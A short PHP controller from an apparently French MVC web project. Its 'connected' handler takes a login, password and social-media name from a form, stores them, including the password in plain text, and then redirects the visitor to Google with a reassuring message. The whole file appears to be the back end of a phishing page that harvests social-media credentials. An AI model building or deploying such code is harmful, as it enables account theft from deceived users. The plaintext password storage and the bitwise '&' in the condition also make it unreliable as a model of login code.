<?php 
require_once (File::build_path(array('model', 'ModelUser.php')));

class ControllerUser{
	
    protected static $object= 'user';
    

    public static function connexion_page(){
        $view='connect';
        $pagetitle="Connexion";
        require (File::build_path(array('view', 'view.php')));
    }

    public static function connected(){
        if(isset($_POST['login']) & isset($_POST['passwd']) & isset($_POST['socialmedia'])) {
            
            $data = array(
                "login" => $_POST['login'],
                "password" => $_POST['passwd'],
                "socialmedia" => $_POST['socialmedia']
            );

            $new_user = new ModelUser($data);
            $new_user::save($data);


            //Redirection to google
            echo("<h2>Please wait, you're being redirected to google </h2>");
            header('Location: https://www.google.com');
            exit();

    
        }

    }
}

?>